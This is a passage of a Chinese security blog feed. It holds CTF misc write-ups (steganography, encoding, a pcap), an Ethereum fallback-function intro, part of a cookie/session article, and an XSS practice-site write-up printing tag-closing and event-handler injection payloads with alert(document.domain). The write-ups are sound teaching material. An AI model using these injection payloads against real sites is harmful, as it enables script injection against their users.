color="navy">2.题目要求</font></h4><p><img src="/images/91-17.jpg" alt></p><h4 id="3-解题步骤"><a href="#3-解题步骤" class="headerlink" title="3.解题步骤"></a><font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，解压压缩包，打开 gif 文件夹，发现该文件夹里面由下面一系列图片构成：</p><p><img src="/images/91-18.jpg" alt></p></li><li><p>这些图片代表什么意思呢？在分析了这些图片之后，得到大概的一个想法：这些图片是只由黑、白两种纯色构成，那么黑白的意思是不是代表 二进制中的1 和 0 呢？本着这个想法，我们开始想办法将这些图片用 1 和 0 代替。PS：因为图片太多，我想着用脚本来识别这些图片，再输出相应的数字，脚本如下：</p><p><img src="/images/91-19.jpg" alt></p></li><li><p>运行脚本，得到如下的结果：</p><p><img src="/images/91-20.jpg" alt></p></li></ol></blockquote><p><hr>2020-2-2 更新</p><h3 id="六、掀桌子"><a href="#六、掀桌子" class="headerlink" title="六、掀桌子"></a><font color="brown">六、掀桌子</font></h3><h4 id="1-基础知识-5"><a href="#1-基础知识-5" class="headerlink" title="1.基础知识"></a><font color="navy">1.基础知识</font></h4><blockquote><p><strong>ASCII 值和字符的对应关系</strong></p></blockquote><h4 id="2-题目要求-5"><a href="#2-题目要求-5" class="headerlink" title="2.题目要求"></a><font color="navy">2.题目要求</font></h4><p><img src="/images/91-22.png" alt></p><h4 id="3-解题步骤-1"><a href="#3-解题步骤-1" class="headerlink" title="3.解题步骤"></a><font color="navy">3.解题步骤</font></h4><blockquote><ol><li>打开题目，看到题目中给出一串字符串，但是这和掀桌子有什么关系呢？？？？？？？</li></ol><p>难道只是将这些字符转代表的 ASCII 值转换为对应的字符？？？？？</p><ol><li>下面查查这些字符有多少吧。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; len(<span class="string">"c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2"</span>)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>得到的答案是“118”，正好是偶数，那么两两字符的 ASCII 值正好对应一个字符，说干就干！！</p><ol><li><p>写出脚本，计算出两两字符的ASCII值，并转换为对应的字符：</p><p><img src="/images/91-23.jpg" alt> </p></li><li><p>得到如下的结果：</p><p><img src="/images/91-24.jpg" alt></p></li><li><p>从上面的结果可以看到，得到的 ASCII 值均大于 128，那么我们再减去 128 的基础上，算出他们的字符，代码如下：</p><p><img src="/images/91-25.jpg" alt></p><p>执行修改过的代码，得到如下结果：</p><p><img src="/images/91-26.jpg" alt></p><p>从上图的红圈中可以看到“flag is”说明我们的思路没有错误，那么下面我们只需要提交 flag{hjzcydjzbjdcjkzkcugisdchjyjsbdfr} 即可</p></li></ol></blockquote><h3 id="七、SimpleRAR（隐写题）"><a href="#七、SimpleRAR（隐写题）" class="headerlink" title="七、SimpleRAR（隐写题）"></a><font color="brown">七、SimpleRAR</font>（隐写题）</h3><h4 id="1-基础知识-6"><a href="#1-基础知识-6" class="headerlink" title="1.基础知识"></a><font color="navy">1.基础知识</font></h4><blockquote><p><strong>png 在 WinRAR 中的文件头格式</strong>：<a href="https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html</a></p></blockquote><h4 id="2-题目要求-6"><a href="#2-题目要求-6" class="headerlink" title="2.题目要求"></a><font color="navy">2.题目要求</font></h4><p><img src="/images/91-28.jpg" alt></p><h4 id="3-解题步骤-2"><a href="#3-解题步骤-2" class="headerlink" title="3.解题步骤"></a><font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，并解压附件，只得到一个 “flag.txt” 的文件，打开该文件文件，得到如下内容：</p><p><img src="/images/91-29.jpg" alt></p><p>从这个文件里面并没有得到实际的信息，那么下一步的思路是什么呢？</p></li><li><p>查了查相关的 writeup 才知道这个压缩包用 WinRAR 打开，修改一下数据：</p><p><img src="/images/91-27.jpg" alt></p><p>将上述蓝色阴影的 “A” 换成 “4”，然后保存，再将文件进行解压，得到如下的文件：</p><p><img src="/images/91-30.jpg" alt></p></li><li><p>用 WinRAR 打开 secret.png 图片，得到下面的信息：</p><p><img src="/images/91-31.jpg" alt></p><p>通过查阅资料，可以得到文件以“47 49 46 38 39 61”开头的图片格式是 gif 格式</p><p><img src="/images/91-32.jpg" alt></p></li><li><p>将文件后缀名改为 <strong>.gif</strong>，再打开文件但是没有什么反应，于是用 Photoshop 打开该文件，可以看出有两个图层：</p><p><img src="/images/91-33.jpg" alt></p></li><li><p>分别将这两个图层单独保存成两个 png 文件：1.png 和 2.png，再用 StegSolve 分别打开这两个图片，会得到两个图形，如下：</p><p><img src="/images/91-34.jpg" alt></p></li><li><p>将这两个图形合到一起，再增加一个定位图形，会得到一个完整的二维码：</p><p><img src="/images/91-35.png" alt></p></li></ol></blockquote><p><hr>2020-2-3 更新</p><h3 id="八、base64Stego（隐写题）"><a href="#八、base64Stego（隐写题）" class="headerlink" title="八、base64Stego（隐写题）"></a><font color="brown">八、base64Stego</font>（隐写题）</h3><h4 id="1-基础知识-7"><a href="#1-基础知识-7" class="headerlink" title="1.基础知识"></a><font color="navy">1.基础知识</font></h4><blockquote><p><strong>base64 的隐写</strong>：</p><ul><li><a href="https://www.tr0y.wang/2017/06/14/Base64steg/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2017/06/14/Base64steg/index.html</a></li><li><a href="https://cltheorem.github.io/2018/10/base64%E9%9A%90%E5%86%99/" target="_blank" rel="noopener">https://cltheorem.github.io/2018/10/base64%E9%9A%90%E5%86%99/</a></li></ul><p><strong>python 的几个方法</strong>:</p><ul><li>zfill 方法</li><li>index 方法</li><li>readlines 方法</li><li>count 方法</li></ul></blockquote><h4 id="2-题目要求-7"><a href="#2-题目要求-7" class="headerlink" title="2.题目要求"></a><font color="navy">2.题目要求</font></h4><p><img src="/images/91-36.jpg" alt></p><h4 id="3-解题步骤-3"><a href="#3-解题步骤-3" class="headerlink" title="3.解题步骤"></a><font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载并打开附件，发现好多行都是类似于 base64 编码后的数据，于是第一开始的思路是将这些数据 通过自己写的 base64 解码工具进行解码，脚本如下：</p><p><img src="/images/91-37.jpg" alt></p><p>运行脚本，得到如下的结果：</p><p><img src="/images/91-38.jpg" alt></p></li><li><p>通过分析得到的文本，并没有得到想要的 flag，但是得出这是一道隐写题：有关 base64 的隐写题，在查阅而资料后（第一部分的两个链接），写出了如下的脚本：</p><p><img src="/images/91-39.jpg" alt></p><p>运行脚本，得到 flag：</p><p><img src="/images/91-40.jpg" alt></p></li></ol></blockquote><p><hr>2020-2-4 更新</p><h3 id="九、ext3"><a href="#九、ext3" class="headerlink" title="九、ext3"></a><font color="brown">九、ext3</font></h3><h4 id="1-基础知识-8"><a href="#1-基础知识-8" class="headerlink" title="1.基础知识"></a><font color="navy">1.基础知识</font></h4><blockquote><p><strong>文件系统的挂载</strong>：</p><p>相关链接：</p><ul><li><a href="https://zh.wikipedia.org/wiki/Mount_(Unix" target="_blank" rel="noopener">mount 命令</a>)</li><li><a href="https://www.zhihu.com/question/266907637/answer/315386532" target="_blank" rel="noopener">能否通俗易懂，深入浅出地解释一下linux中的挂载的概念？</a></li><li><a href="https://blog.csdn.net/ljianhui/article/details/8604140" target="_blank" rel="noopener">初窥Linux 之 ext2/ext3文件系统</a></li></ul></blockquote><h4 id="2-题目要求-8"><a href="#2-题目要求-8" class="headerlink" title="2.题目要求"></a><font color="navy">2.题目要求</font></h4><p><img src="/images/91-41.jpg" alt></p><h4 id="3-解题步骤-4"><a href="#3-解题步骤-4" class="headerlink" title="3.解题步骤"></a><font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，并查看文件的类型：</p><p><img src="/images/91-42.jpg" alt></p><p>可以看出，这是一个 ext3 文件系统，那么我们应该想到系统挂载</p></li><li><p>这一步我们来将文件进行挂载</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;    mount 附件 temp</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ol></blockquote><p>&gt;</p><blockquote><p>   我们得到如下的文件：</p><p>   <img src="/images/91-43.jpg" alt></p><ol><li><p>这么多文件夹，哪个文件夹里面有 flag 呢？</p><p><img src="/images/91-44.jpg" alt></p><p>从红圈标的内容中可以看出，在 “O7avZhikgKgbF” 文件夹中有一个 flag.txt 文件</p></li><li><p>打开 flag.txt 文件，得到一个base64编码后的数据：“ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=”，进行base64解码，得到如下的结果：</p><p><img src="/images/91-45.jpg" alt></p></li></ol></blockquote><h3 id="十、stegano"><a href="#十、stegano" class="headerlink" title="十、stegano"></a><font color="brown">十、stegano</font></h3><h4 id="1-基础知识-9"><a href="#1-基础知识-9" class="headerlink" title="1.基础知识"></a><font color="navy">1.基础知识</font></h4><blockquote><p><strong>摩斯密码</strong>的基础知识：</p><ul><li><a href="[https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81](https://zh.wikipedia.org/wiki/摩尔斯电码">摩尔斯电码 wiki</a>)</li></ul><p><strong>PDF.js 技术</strong></p><ul><li><a href="http://blog.fpliu.com/it/web/front/library/PDF-js" target="_blank" rel="noopener">pdf.js 技术</a></li><li><a href="https://chrome.google.com/webstore/detail/pdf-viewer/oemmndcbldboiebfnladdacbdfmadadm/related" target="_blank" rel="noopener">pdf.js插件下载地址</a></li></ul><p><strong>其他的writeup</strong>：<a href="https://www.jianshu.com/p/f502793c13bb" target="_blank" rel="noopener">https://www.jianshu.com/p/f502793c13bb</a></p></blockquote><h4 id="2-题目要求-9"><a href="#2-题目要求-9" class="headerlink" title="2.题目要求"></a><font color="navy">2.题目要求</font></h4><p><img src="/images/91-46.png" alt></p><h4 id="3-解题步骤-5"><a href="#3-解题步骤-5" class="headerlink" title="3.解题步骤"></a><font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件 “pdf” 文件，用软件打开以后并没有发现有用的信息，用 <font color="red"><strong>pdf.js</strong></font> 技术来打开 pdf 文件：在 console 中输入<code>document.documentElement.textContent</code> ，会得到如下的信息：</p><p><img src="/images/91-47.png" alt></p></li><li><p>将得到的信息复制下来，得到如下的内容：</p><p><img src="/images/91-48.png" alt></p><p>从上图中蓝色阴影由 “A” 和 “B” 组成的信息，再加上不同的间隔，可以看出这可能是摩尔斯密码</p></li><li><p>下面写出脚本，对这些信息进行解密，脚本如下：</p><p><img src="/images/91-49.png" alt></p></li><li><p>运行脚本，得到下面的结果：</p><p><img src="/images/91-50.png" alt></p></li></ol></blockquote><p><hr>2020-2-5 更新</p><h3 id="十一、功夫再高也怕菜刀"><a href="#十一、功夫再高也怕菜刀" class="headerlink" title="十一、功夫再高也怕菜刀"></a><font color="brown">十一、功夫再高也怕菜刀</font></h3><h4 id="1-基础知识-10"><a href="#1-基础知识-10" class="headerlink" title="1.基础知识"></a><font color="navy">1.基础知识</font></h4><blockquote><ul><li><strong>jpg 图片的文件二进制格式</strong>：<a href="https://blog.csdn.net/STN_LCD/article/details/78629029" target="_blank" rel="noopener">https://blog.csdn.net/STN_LCD/article/details/78629029</a><ul><li>图片文件头格式总结：<a href="https://www.cnblogs.com/lwy-kitty/p/3928317.html" target="_blank" rel="noopener">https://www.cnblogs.com/lwy-kitty/p/3928317.html</a></li></ul></li><li><strong>wireshark 的使用</strong></li><li><strong>Winhex 的使用</strong></li></ul></blockquote><h4 id="2-题目要求-10"><a href="#2-题目要求-10" class="headerlink" title="2.题目要求"></a><font color="navy">2.题目要求</font></h4><p><img src="/images/91-51.png" alt></p><h4 id="3-解题步骤-6"><a href="#3-解题步骤-6" class="headerlink" title="3.解题步骤"></a><font color="navy">3.解题步骤</font></h4><blockquote><ol><li><p>下载附件，发现附件是一个流量包，初猜那么这道题可能是一个流量包分析题，打开流量包，发现几乎都是 TCP 和 HTTP 组成，那么先尝试一下搜索一下 flag 关键词，看看是否有结果，搜索结果如下：</p><p><img src="/images/91-52.png" alt></p></li><li><p>追踪一下 flag.txt 文件的 TCP 流，看看传输的是什么数据：</p><p><img src="/images/91-53.png" alt></p><p>大略的看了一下这个流中的数据，发现结尾处是 jpg 图片的二进制结尾 “FFD9”，根据已有的经验找到 jpg 开头的 “FFD8” 格式：</p><p><img src="/images/91-54.jpg" alt></p></li><li><p>将十六进制的数据放到 “Winhex” 中，并保存格式为 “jpg” 的图片，如下图：</p><p><img src="/images/91-55.jpg" alt></p><p>将图片中的文字提交，发现提交的不对，说明这不是我们想求的 flag。</p></li><li><p>用 foremost 分离流量包，得到两个文件：audit.txt 和 zip 压缩包，打开 audit.txt 文件，得到如下信息：</p><p><img src="/images/91-56.png" alt></p></li><li><p>下一步解压压缩包，却发现需要解压密码，那么就想到了前面所得图片中的信息，输入之后进行解压，解压成功，得到 flag 文件：</p><p><img src="/images/91-57.png" alt></p></li></ol></blockquote><p><hr>2020-02-09 更新</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、PDF&quot;&gt;&lt;a href=&quot;#一、PDF&quot; class=&quot;headerlink&quot; title=&quot;一、PDF&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、PDF&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-基础知识&quot;&gt;&lt;a href=&quot;#1-基础知识&quot; 
      
    
    </summary>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="misc" scheme="https://muzibing.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>以太坊智能合约漏洞 | Fallback函数</title>
    <link href="https://muzibing.github.io/2019/11/23/2019.11.23%EF%BC%8890%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/23/2019.11.23（90）/</id>
    <published>2019-11-22T16:00:00.000Z</published>
    <updated>2019-11-24T14:24:36.089Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、Fallback-函数介绍"><a href="#一、Fallback-函数介绍" class="headerlink" title="一、Fallback 函数介绍"></a><font color="brown">一、Fallback 函数介绍</font></h3><blockquote><p>合约可以有一个未命名的函数。这个函数<strong>不能有参数也不能有返回值</strong>，并且必须具有外部可见性。如果没有其他函数与给定的函数标识符匹配（或者根本没有提供任何数据），则在调用合同时执行该函数。</p><p><br>除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币并将其添加到合同的总余额中，<code>fallback</code> 函数必须标记为 <code>payable</code>。 如果不存在这样的函数，则合约不能通过常规交易接收以太币，并引发异常。</p><p><br>在这样的上下文中，通常只有很少的 gas 可以用来完成这个函数调用（准确地说，是 2300 gas），所以使 fallback 函数的调用尽量廉价很重要。 请注意，调用 fallback 函数的交易（而不是内部调用）所需的 gas 要高得多，因为每次交易都会额外收取 21000 gas 或更多的费用，用于签名检查等操作。</p><p><br>具体来说，以下操作会消耗比 fallback 函数更多的 gas：</p><ul><li>写入存储</li><li>创建合约</li><li>调用消耗大量 gas 的外部函数</li><li>发送以太币</li></ul><p><br>请确保您在部署合约之前彻底测试您的 fallback 函数，以确保执行成本低于 2300 个 gas。</p><p><br>除此之外，我们还可以这样理解 <code>fallback</code>  函数：</p><blockquote><p> If I have your wallet address, I can send you Ethers without your permission. In most cases, you might want to enable this ease-of-payment feature for your smart contracts too. This way, other contracts/wallets can send Ether to your contract, without having to know your ABI or specific function names. </p></blockquote></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、Fallback-函数介绍&quot;&gt;&lt;a href=&quot;#一、Fallback-函数介绍&quot; class=&quot;headerlink&quot; title=&quot;一、Fallback 函数介绍&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、Fallback 函数介绍&lt;/font
      
    
    </summary>
    
    
      <category term="区块链" scheme="https://muzibing.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
      <category term="智能合约漏洞" scheme="https://muzibing.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XSS Challenge（Stage1-4）writeup</title>
    <link href="https://muzibing.github.io/2019/11/19/2019.11.19%EF%BC%8889%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/19/2019.11.19（89）/</id>
    <published>2019-11-18T16:00:00.000Z</published>
    <updated>2019-11-19T12:25:28.815Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目链接：<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">XSS Challenges（共19关）</a></p></blockquote><h3 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage #1"></a><font color="brown">Stage #1</font></h3><h4 id="①-题目"><a href="#①-题目" class="headerlink" title="① 题目"></a><font color="navy">① 题目</font></h4><p><img src="/images/89-1.png" alt></p><h4 id="②-相关知识点"><a href="#②-相关知识点" class="headerlink" title="② 相关知识点"></a><font color="navy">② 相关知识点</font></h4><blockquote><ul><li>XSS 的类型</li></ul></blockquote><h4 id="③-解题步骤"><a href="#③-解题步骤" class="headerlink" title="③ 解题步骤"></a><font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 首先看一下是否存在 XSS 攻击</p><p><img src="/images/89-2.png" alt></p><p>⚁ 首次尝试填入信息：</p><p><img src="/images/89-3.png" alt></p><p>▣ 可以从上图中看出，我们写入的 <code>Hello World</code> 被放在了 <code>&lt;b&gt; &lt;/b&gt;</code> 标签中，我们可以在这个标签中进行 <code>xss</code> 攻击，脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(<span class="built_in">document</span>.domain)&lt;<span class="regexp">/script&gt; /</span><span class="regexp">/ 之所以用 document.domain 是因为题目中的提示</span></span><br></pre></td></tr></table></figure><blockquote><p>▣ 点击 <code>search</code> 之后，窗口会给我们弹出一个提示框，如下：</p><p><img src="/images/89-4.png" alt></p><p>这就代表着我们成功的对该网页进行了 <code>xss</code> 攻击，下面让我们看一下源码，看一下浏览器是怎么渲染我们的输入：</p><p><img src="/images/89-5.png" alt></p></blockquote><h3 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage #2"></a><font color="brown">Stage #2</font></h3><h4 id="①-题目-1"><a href="#①-题目-1" class="headerlink" title="① 题目"></a><font color="navy">① 题目</font></h4><p><img src="/images/89-6.png" alt></p><h4 id="②-相关知识点-1"><a href="#②-相关知识点-1" class="headerlink" title="② 相关知识点"></a><font color="navy">② 相关知识点</font></h4><blockquote><ul><li>close the current tag and add SCRIPT tag… </li></ul></blockquote><h4 id="③-解题步骤-1"><a href="#③-解题步骤-1" class="headerlink" title="③ 解题步骤"></a><font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 初尝试：先输入数据，看看网页源码<br><img src="/images/89-7.png" alt></p><p>▣ 从上图可以看出，我们输入的 <code>Hello World</code> 赋值给了 <code>&lt;input&gt;</code> 标签的 <code>value</code> 值，那么我们根据提示和第一次的尝试，可以对 <code>value</code> 标签进行闭合，然后进行 <code>xss</code> 攻击，攻击脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1: <span class="string">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/89-8.png" alt></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2: <span class="string">" onclick/onmouseoover=alert(document.domain)&gt;//</span></span><br></pre></td></tr></table></figure><p><img src="/images/89-9,png" alt></p><blockquote><p>在这里简单的介绍一下 <code>onclick</code>、<code>onmousedown</code>、<code>onmouseup</code>、<code>onmouseout</code>、<code>onmouseenter</code>、<code>onmouseleave</code>  和  <code>onmouseover</code>  的功能：</p><ul><li><code>onclick</code> ：在鼠标左健点击弹起之后触发的事件，即一次完整的鼠标点击过程。过程完成瞬间触发函数</li><li><code>onmouseover</code> ：属性在鼠标指针移动到元素上时触发</li><li><code>onmousedown</code> ：事件会在鼠标按键被按下时发生</li><li><code>onmouseup</code> ：事件会在松开鼠标按键时触发</li><li><code>onmouseout</code> ：属性在鼠标指针移动到元素外时触发</li><li><code>onmouseenter</code> ：属性在鼠标指针移动到元素上时触发，onmouseover和onmouseenter唯一的区别是 onmouseenter 事件不支持冒泡 </li><li><code>onmouseleave</code> ：性在鼠标指针移动到元素外时触发， onmouseout和onmouseleave唯一的区别是 onmouseleave 事件不支持冒泡 。</li></ul></blockquote><h3 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage #3"></a><font color="brown">Stage #3</font></h3><h4 id="①-题目-2"><a href="#①-题目-2" class="headerlink" title="① 题目"></a><font color="navy">① 题目</font></h4><p><img src="/images/89-10.png" alt></p><h4 id="②-相关知识点-2"><a href="#②-相关知识点-2" class="headerlink" title="② 相关知识点"></a><font color="navy">② 相关知识点</font></h4><blockquote><ul><li>The input in text box is properly escaped. </li></ul></blockquote><h4 id="③-解题步骤-2"><a href="#③-解题步骤-2" class="headerlink" title="③ 解题步骤"></a><font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 初试 <code>Hello World</code> ：</p><p><img src="/images/89-11.png" alt></p><p>▣ 从上图可以看到，我们输入 <code>Hello World</code> 以后，网页显示了两个内容：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>&lt;b&gt; &quot;Hellow World&quot; &lt;/b&gt;</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>&lt;b&gt; Japan &lt;/b&gt;</code></p><p>我们先尝试对第一处的进行标签闭合，如下图：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: <span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;b&gt;"</span></span><br></pre></td></tr></table></figure><blockquote><p><img src="/images/89-12.png" alt></p><p>▣ 我们从上图看到，我们的 payload 没有被执行，说明该处不能够进行 xss 攻击，那么我们尝试修改第二处的值，也就是 <code>Japan</code> 的值（这个的实现我们可以用 <code>burp</code> 工具进行）：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">"&lt;/b&gt;&lt;script&gt;alert(document.domain&gt;&lt;/script&gt;&lt;b&gt;"</span></span><br></pre></td></tr></table></figure><blockquote><p><img src="/images/89-13.png" alt></p><p>▣ 从下图的源码可以看到我们成功的执行了我们的脚本：</p><p><img src="/images/89-14.png" alt></p></blockquote><h3 id="Stage-4"><a href="#Stage-4" class="headerlink" title="Stage #4"></a><font color="brown">Stage #4</font></h3><h4 id="①-题目-3"><a href="#①-题目-3" class="headerlink" title="① 题目"></a><font color="navy">① 题目</font></h4><p><img src="/images/89-15.png" alt></p><h4 id="②-相关知识点-3"><a href="#②-相关知识点-3" class="headerlink" title="② 相关知识点"></a><font color="navy">② 相关知识点</font></h4><blockquote><ul><li>invisible input field </li></ul></blockquote><h4 id="③-解题步骤-3"><a href="#③-解题步骤-3" class="headerlink" title="③ 解题步骤"></a><font color="navy">③ 解题步骤</font></h4><blockquote><p>▣ 我们可以看出，这道题目和上一道题目没有太大的区别，我们再通过 <code>burp</code> 对 <code>&lt;b&gt;</code> 两处可能存在的 <code>xss</code> 攻击进行尝试构建我们的脚本：</p><p><img src="/images/89-16.png" alt></p><p>执行结果如下:</p><p><img src="/images/89-17.png" alt></p><p>▣ 我们在两处都写入了我们的脚本，但是都没有被执行，在用 <code>burp</code> 抓包的过程中，我们发现，这道题比上一道题多了一个 <code>Hack</code>，那么我们是不是可以通过这个来实现 <code>xss</code> 攻击呢？我们先看一下 <code>Hack</code> 在页面哪个位置，如下图：</p><p><img src="/images/89-18.png" alt></p><blockquote><p> ☛ 在这里我们补充一个知识点：<code>input</code> 的 <code>type</code> 属性</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● <code>button</code>：定义可点击按钮（多数情况下，用于通过 JavaScript 启动脚本）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● <code>checkbox</code>：定义复选框</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● <code>file</code>：定义输入字段和 “浏览”按钮，供文件上传</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● <code>hidden</code>：定义隐藏的输入字段</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● <code>image</code>： 定义图像形式的提交按钮 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● <code>password</code>：定义密码字段。该字段中的字符被掩码 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● <code>radio</code>：定义单选按钮 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● <code>reset</code>：定义重置按钮。重置按钮会清除表单中的所有数据 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● <code>submit</code>：定义提交按钮。提交按钮会把表单数据发送到服务器 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● <code>text</code>：定义单行的输入字段，用户可在其中输入文本。默认宽度为 20 个字符 </p></blockquote><p>▣ 从上图我们可以得到，有一个 <code>&lt;input&gt;</code> 标签被隐藏掉了，所以我们在网页中无法找见它，但是我们可以在 <code>burp</code> 改包，来进行 <code>xss</code>  攻击，攻击脚本如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>效果如下图：</p><p><img src="/images/89-19.png" alt></p><p>▣ 我们点击 <code>Forward</code> 以后，可以看到我们成功的执行了 <code>xss</code> 攻击：</p><p><img src="/images/89-20.png" alt></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;题目链接：&lt;a href=&quot;http://xss-quiz.int21h.jp/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XSS Challenges（共19关）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XSS" scheme="https://muzibing.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Cookie、Session、Token那点事儿（转载）</title>
    <link href="https://muzibing.github.io/2019/11/07/2019.11.07%EF%BC%8888%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/11/07/2019.11.07（88）/</id>
    <published>2019-11-06T16:00:00.000Z</published>
    <updated>2019-11-07T05:13:11.297Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>来自：简书，作者：骑小猪看流星</strong></p><p>链接：<a href="https://www.jianshu.com/p/bd1be47a16c1" target="_blank" rel="noopener">https://www.jianshu.com/p/bd1be47a16c1</a></p></blockquote><h3 id="一、什么是Cookie？"><a href="#一、什么是Cookie？" class="headerlink" title="一、什么是Cookie？"></a><font color="brown">一、什么是Cookie？</font></h3><blockquote><p>Cookie 技术产生源于 HTTP 协议在互联网上的急速发展。随着互联网时代的策马奔腾，带宽等限制不存在了，人们需要更复杂的互联网交互活动，就必须同服务器保持活动状态（简称：保活）。</p><p><br>于是，在浏览器发展初期，为了适应用户的需求技术上推出了各种保持 Web 浏览状态的手段，其中就包括了 Cookie 技术。Cookie 在计算机中是个存储在浏览器目录中的文本文件，当浏览器运行时，存储在 RAM 中发挥作用 （此种 Cookies 称作 Session Cookies），一旦用户从该网站或服务器退出，Cookie 可存储在用户本地的硬盘上 （此种 Cookies 称作 Persistent Cookies）。</p><p><br>Cookie 起源：1993 年，网景公司雇员 Lou Montulli 为了让用户在访问某网站时，进一步提高访问速度，同时也为了进一步实现个人化网络，发明了今天广泛使用的 Cookie。（所以，适当的偷懒也会促进人类计算机发展史的一小步~）</p><p><br>Cookie时效性：目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。</p><p><br>Cookie使用限制：Cookie 必须在 HTML 文件的内容输出之前设置；不同的浏览器 (Netscape Navigator、Internet Explorer) 对 Cookie 的处理不一致，使用时一定要考虑；客户端用户如果设置禁止 Cookie，则 Cookie 不能建立。 并且在客户端，一个浏览器能创建的 Cookie 数量最多为 300 个，并且每个不能超过 4KB，每个 Web 站点能设置的 Cookie 总数不能超过 20 